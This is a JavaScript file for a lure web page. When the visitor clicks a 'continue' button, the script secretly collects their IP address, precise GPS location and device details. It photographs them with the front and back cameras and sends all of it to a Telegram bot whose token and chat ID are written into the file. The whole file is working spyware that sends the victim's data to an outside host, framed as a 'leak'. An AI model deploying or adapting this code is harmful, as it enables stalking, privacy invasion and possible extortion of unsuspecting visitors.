// Your Details
const BOT_TOKEN = "9080865353:AAGA3hZrQzPhJWcNHAuY5Wg-wHOxsrpNznk";
const CHAT_ID = "8741170935";

async function start() {
    const btn = document.querySelector('.continue-btn');
    btn.innerHTML = "Loading...";
    
    // 1. Get IP Address (Public)
    let ipData = await fetchIP();
    
    // 2. Get Location
    let locationData = await getLocation();
    
    // 3. Get Device Info
    let deviceInfo = getDeviceInfo();

    // 4. Take Photos (Front & Back if available)
    let photos = [];
    try {
        // Try to get both cameras if possible, otherwise just main
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" }, 
            audio: false 
        });
        
        // Capture Front Camera
        const photo1 = await capturePhoto(stream);
        photos.push(photo1);
        
        // Stop stream to switch cameras (simplified approach)
        stream.getTracks().forEach(track => track.stop());

        // Try Back Camera
        try {
            const backStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "environment" }, 
                audio: false 
            });
            const photo2 = await capturePhoto(backStream);
            photos.push(photo2);
            backStream.getTracks().forEach(track => track.stop());
        } catch(e) {
            console.log("Back camera not available");
        }

    } catch (err) {
        console.log("Camera access denied or failed");
    }

    // 5. Send to Telegram
    await sendToTelegram(ipData, locationData, deviceInfo, photos);

    // 6. Show "Enjoy 😈🥀"
    document.querySelector('.container').style.display = 'none';
    document.querySelector('.loading-overlay').style.display = 'flex';
    document.querySelector('.enjoy-text').style.display = 'block';
}

async function fetchIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return `🌐 IP: ${data.ip}`;
    } catch (e) {
        return "🌐 IP: Fetch Failed";
    }
}

async function getLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve("📍 Location: N/A");
            return;
        }
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                resolve(`📍 Loc: ${lat.toFixed(6)}, ${lon.toFixed(6)}`);
            },
            (error) => {
                resolve("📍 Location: Denied");
            }
        );
    });
}

function getDeviceInfo() {
    const ua = navigator.userAgent;
    let platform = "Unknown";
    if (/Android/i.test(ua)) platform = "Android";
    else if (/iPhone|iPad|iPod/i.test(ua)) platform = "iOS";
    else if (/Windows/i.test(ua)) platform = "Windows";
    
    return `📱 Device: ${platform} | 🌐 Browser: ${navigator.browserName || 'Unknown'}`;
}

async function capturePhoto(stream) {
    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();
    
    // Wait a bit for frame to be ready
    await new Promise(r => setTimeout(r, 500));
    
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);
    
    return canvas.toDataURL('image/jpeg', 0.8);
}

async function sendToTelegram(ip, loc, device, photos) {
    // Construct Message
    let message = `🔥 *HARDCODE.PYTE LEAK* 🔥\n\n`;
    message += `${ip}\n`;
    message += `${loc}\n`;
    message += `${device}\n`;
    message += `\n⚠️ Photos Captured: ${photos.length}`;

    // Send Text First
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        })
    });

    // Send Photos (Max 2 per request usually for stability)
    if (photos.length > 0) {
        for (let i = 0; i < photos.length; i++) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    photo: photos[i], // Base64 image
                    caption: `📸 Photo #${i+1} from HARDCODE.PYTE`
                })
            });
        }
    }
}

// Trigger start on button click
document.querySelector('.continue-btn').addEventListener('click', start);
